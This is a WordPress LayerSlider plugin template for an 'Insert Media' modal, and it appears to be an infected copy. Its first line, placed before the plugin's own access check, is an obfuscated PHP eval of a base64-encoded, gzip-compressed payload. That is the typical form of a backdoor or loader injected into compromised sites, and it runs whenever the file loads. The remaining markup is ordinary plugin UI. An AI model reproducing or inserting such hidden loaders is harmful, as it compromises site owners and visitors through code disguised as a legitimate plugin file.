<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php if(!defined('LS_ROOT_FILE')) { header('HTTP/1.0 403 Forbidden'); exit; } ?>
<script type="text/html" id="tmpl-insert-media-modal">
	<div id="tmpl-insert-media-modal-window">
		<header>
			<h1><?php _e('Insert Media', 'LayerSlider') ?></h1>
			<b class="dashicons dashicons-no"></b>
		</header>
		<div class="km-ui-modal-scrollable">

			<div class="ls-left">

				<div class="ls-url divider">
					<span><?php _ex('or', 'Media modal divider', 'LayerSlider') ?></span>
					<h3><?php _e('Insert from URL (YouTube, Vimeo)', 'LayerSlider') ?></h3>
					<input type="text">
					<button class="button button-primary ls-insert"><?php _e('Add Video', 'LayerSlider') ?></button>
				</div>

				<div class="ls-embed-code divider">
					<span><?php _ex('or', 'Media modal divider', 'LayerSlider') ?></span>
					<h3><?php _e('Paste embed or HTML code', 'LayerSlider') ?></h3>
					<textarea></textarea>
					<button class="button button-primary ls-insert"><?php _e('Add Media', 'LayerSlider') ?></button>
				</div>

				<div class="ls-html5">
					<h3><?php _e('Add self-hosted HTML 5 video', 'LayerSlider') ?></h3>
					<p><?php _e('You can select multiple media formats to maximize browser compatibility across devices by holding down the Ctrl / Command key and selecting multiple uploads. We recommend using MP3 or AAC in MP4 for audio, and VP8+Vorbis in WebM or H.264+MP3/AAC in MP4 for video.', 'LayerSlider') ?></p>
					<button class="button button-primary button-hero ls-html5-button"><?php _e('Choose Media', 'LayerSlider') ?></button>
				</div>
			</div>

			<div class="ls-right">
				<h3><?php _e('Preview', 'LayerSlider') ?></h3>
				<div class="ls-media-preview"></div>
			</div>
		</div>
	</div>
</script>